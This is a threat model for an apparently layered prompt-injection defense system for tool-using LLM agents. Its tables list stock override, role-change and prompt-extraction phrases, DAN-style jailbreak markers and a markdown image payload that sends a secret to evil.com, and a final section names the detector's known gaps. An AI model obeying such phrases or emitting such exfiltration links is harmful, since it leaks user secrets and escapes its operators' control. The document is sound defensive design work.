# Secure Zeph — Threat Model

## Scope

This threat model covers prompt injection attacks against LLM-powered agentic systems where the agent can call tools, access external data, and take actions on behalf of users.

## Attacker Goals

| Goal | Description | Impact |
|------|-------------|--------|
| **Data Exfiltration** | Extract system prompts, API keys, user data, or internal state | Confidentiality breach |
| **Unauthorized Actions** | Trick agent into executing unintended tool calls (send emails, modify files, API calls) | Integrity violation |
| **Privilege Escalation** | Gain admin/system-level capabilities through prompt manipulation | Authorization bypass |
| **Safety Bypass** | Circumvent content filters, safety guardrails, or refusal mechanisms | Policy violation |
| **Denial of Service** | Cause agent to enter loops, consume excessive resources, or fail silently | Availability impact |

## Attack Surface

### Input Vectors

| Vector | Trust Zone | Risk | Example |
|--------|-----------|------|---------|
| **User Input** | USER (medium) | Direct injection | "Ignore all previous instructions and..." |
| **Retrieved Context** | RETRIEVED (low) | Indirect injection | Malicious content in RAG documents, emails, web pages |
| **Tool Output** | TOOL_OUTPUT (low) | Latent injection | Tool returns data containing hidden instructions |
| **Model Draft** | MODEL_DRAFT (verify) | Confused deputy | Model proposes tool call influenced by injected context |

### Attack Categories (15 categories, 105 rules)

| # | Category | Description | Example Techniques | Rules |
|---|----------|-------------|-------------------|-------|
| 1 | **OVERRIDE** | Override system instructions | "Ignore previous", "forget everything", "new system prompt" | HR-001–003, HR-086+ |
| 2 | **SECRET_EXTRACTION** | Extract confidential information | "Reveal system prompt", "show API key" | HR-007–008 |
| 3 | **ROLE_CONFUSION** | Change agent identity/behavior | "You are now", "act as", "pretend to be" | HR-004–005, HR-101 |
| 4 | **INSTRUCTION_SMUGGLING** | Inject new instructions via encoding/framing | "Developer mode", DAN, jailbreak | HR-006, HR-033–036 |
| 5 | **TOOL_ABUSE** | Unauthorized tool execution | "Execute command", "send email to attacker" | HR-009–011, HR-100 |
| 6 | **INDIRECT_INJECTION** | Instructions hidden in context data | "As an AI assistant", "instructions for the model" | HR-012–015, HR-063–065 |
| 7 | **EXFILTRATION** | Data extraction via URLs, images, URIs | Markdown image exfil, base64 URL params, data:// | HR-016–018, HR-044 |
| 8 | **ENCODING_EVASION** | Encode payload to bypass detection | Base64, ROT13, braille, morse, leetspeak | HR-028, HR-038–039 |
| 9 | **PERSONA_MARKERS** | Known jailbreak persona identifiers | [DAN], STAN, DUDE, [JAILBREAK] | HR-033–036 |
| 10 | **EXPLOITATION** | Technical injection (SQL, Jinja, shell) | SQL injection, template injection, echo commands | HR-040–043 |
| 11 | **LATENT_INJECTION** | Hidden instructions in formatted output | Separator-based injections, invisible markers | HR-037, HR-103 |
| 12 | **DENIED_REQUESTS** | Social engineering to override refusals | "Don't refuse", "for educational purposes" | HR-056–057 |
| 13 | **ACTION_OVERRIDE** | Direct override of planned actions | "Instead do X", "change the plan" | HR-066+ |
| 14 | **CHAIN_COMMANDS** | Command chaining to escalate | "Read file then send to..." | HR-100 |
| 15 | **PRIVILEGE_ESCALATION** | Claim elevated privileges | "I am admin", "special override" | HR-023, HR-052, HR-102 |

## Threat Scenarios

### T1: Direct Prompt Injection
**Vector**: User input
**Technique**: Explicit override command ("Ignore all previous instructions")
**Defense**: L1 heuristic rules (OVERRIDE category)
**Status**: ✅ 100% detection rate

### T2: Encoding Evasion
**Vector**: User input
**Technique**: Base64/URL-encode malicious payload
**Defense**: L0 normalizer (inline decode) + L1 rules
**Status**: ✅ Detected after L0 fix (Phase 8)

### T3: Zero-Width Character Obfuscation
**Vector**: User input
**Technique**: Insert zero-width characters between words
**Defense**: L0 strip + spaced variant in secondary L1 scan
**Status**: ✅ Detected after secondary scan fix (Phase 8)

### T4: Unicode Homoglyph Attack
**Vector**: User input
**Technique**: Replace Latin chars with visually identical Unicode
**Defense**: L0 homoglyph normalization
**Status**: ✅ Detected

### T5: Indirect Injection via RAG
**Vector**: Retrieved context
**Technique**: Natural language instructions in documents ("Please unlock my door")
**Defense**: L1 rules for instruction patterns in context
**Status**: ⚠️ 34% detection (66% miss rate for InjecAgent natural language)

### T6: Markdown Image Exfiltration
**Vector**: Model draft / retrieved context
**Technique**: `![](https://evil.com/leak?data=SECRET)`
**Defense**: L1 exfiltration rules + L4 URL allowlist
**Status**: ✅ Detected

### T7: Tool Call Manipulation
**Vector**: Model draft (influenced by injected context)
**Technique**: Agent calls dangerous tool based on poisoned context
**Defense**: L4 Tool Firewall (allowlist, arg validation) + L5 Alignment Gate
**Status**: ✅ Blocked by policy

### T8: Canary Token Leakage
**Vector**: Model output
**Technique**: Attacker extracts planted canary tokens
**Defense**: L4 canary detection in tool arguments
**Status**: ✅ Detected

### T9: Persona Jailbreaks (DAN/STAN)
**Vector**: User input
**Technique**: Known jailbreak scripts with persona markers
**Defense**: L1 persona marker rules
**Status**: ✅ Detected

### T10: Multi-Turn Escalation
**Vector**: User input (across turns)
**Technique**: Gradually escalate requests across conversation
**Defense**: ⚠️ Only single-turn patterns detected; multi-turn requires conversation tracking
**Status**: ⬜ Partial (single-message patterns only)

## Defense Coverage Matrix

| Threat | L0 | L1 | L2 | L3 | L4 | L5 | Status |
|--------|----|----|----|----|----|----|--------|
| Direct injection | ✓ | ✓ | — | — | — | — | ✅ |
| Encoding evasion | ✓ | ✓ | — | — | — | — | ✅ |
| Zero-width obfuscation | ✓ | ✓ | — | — | — | — | ✅ |
| Homoglyph attack | ✓ | ✓ | — | — | — | — | ✅ |
| Indirect injection (natural lang) | — | △ | needed | needed | — | — | ⚠️ |
| Exfiltration | — | ✓ | — | — | ✓ | — | ✅ |
| Tool abuse | — | ✓ | — | — | ✓ | ✓ | ✅ |
| Canary leakage | — | — | — | — | ✓ | — | ✅ |
| Persona jailbreaks | — | ✓ | — | — | — | — | ✅ |
| Multi-turn escalation | — | △ | — | — | — | — | ⬜ |

Legend: ✓ = primary defense, △ = partial, needed = required for full coverage

## Known Gaps

1. **Natural language indirect injection**: InjecAgent-style attacks where `retrieved_context` contains benign-sounding but malicious instructions. Regex cannot distinguish "Please unlock my front door" (attack in context) from legitimate content. **Mitigation**: L2 Semantic Scorer (planned).

2. **Multi-turn attacks**: CrescendoAttack and similar patterns that escalate across conversation turns. Current system is stateless per-request. **Mitigation**: Future conversation-level tracking.

3. **Novel encodings**: New encoding schemes not covered by L0 normalizer. **Mitigation**: Continuous research monitoring + rule updates.

4. **Adversarial ML evasion**: When L3 classifier is implemented, dedicated adversarial examples could bypass it. **Mitigation**: Layered defense ensures L1 + L3 must both miss.

## Trust Zones

| Zone | Trust Level | Scan Behavior |
|------|------------|---------------|
| SYSTEM | Full | No scanning |
| USER | Medium | L0→L1, conditional L2→L3 |
| RETRIEVED | Low | Full pipeline L0→L3 |
| TOOL_OUTPUT | Low | Full pipeline L0→L3 |
| MODEL_DRAFT | Verify | L4→L5 for tool calls |
